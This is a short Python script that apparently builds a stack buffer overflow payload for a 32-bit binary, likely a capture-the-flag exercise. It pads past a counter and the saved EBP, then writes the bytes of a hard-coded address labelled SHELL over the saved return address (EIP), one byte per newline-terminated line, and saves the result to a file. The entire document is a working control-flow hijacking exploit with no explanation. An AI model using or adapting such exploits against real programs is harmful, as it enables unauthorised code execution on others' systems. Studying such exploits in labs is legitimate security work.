import struct

def p(x):
    return struct.pack("<I", x)

SHELL = 0x080486fd

payload = ""
payload += "A" * 0x10 # Overwrite counter
payload += "\n"
payload += "B\n" * 10
payload += "C\n" * 4
payload += "D\n" * 4
payload += "E\n" * 4 #EBP

# Overwrite EIP
payload += "\xfd\x0a"
payload += "\x86\x0a"
payload += "\x04\x0a"
payload += "\x08\x0a"

with open("payload2", "w") as f:
    f.write(payload)
